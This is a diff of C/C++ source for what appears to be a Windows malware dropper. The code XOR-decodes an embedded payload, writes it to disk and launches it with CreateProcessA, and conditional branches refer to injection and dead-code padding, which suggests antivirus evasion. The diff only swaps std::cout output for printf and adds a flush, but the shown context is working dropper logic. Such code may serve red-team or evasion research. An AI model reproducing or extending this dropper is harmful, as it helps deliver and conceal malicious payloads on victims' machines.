@@ -89,12 +89,13 @@ int main(int argc, char* argv[])
 		data = XOR(data, size);
 	#endif
 
+	fflush(NULL);
 	// where to drop
 	set_name();
 	// Drop to Disk
 	drop(size, data);
 	// process
-	std::cout << "Just before launch\n";
+	printf("Just before launch\n");
 	launch();
 #ifdef DEAD_CODE
 	// dead code
@@ -141,10 +142,10 @@ void launch()
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	std::cout << "Inject macro not defined" << std::endl;
+	printf("Inject macro not defined\n");
 	BOOL err = CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (!err) {
-		std::cout << "Create Process failed. Error: " << GetLastError() << std::endl;
+		printf("Create Process failed. Error: %u\n", GetLastError());
 	}
 #endif
 }
@@ -215,7 +216,7 @@ void drop(int size, void* buffer)
 	FILE* f = fopen(name, "wb");
 	// traverse byte list
 	if (!f) {
-		std::cout << "Dropping failed due to file error." << std::endl;
+		printf("Dropping failed due to file error.\n");
 		perror("fopen");
 	}
 	else {
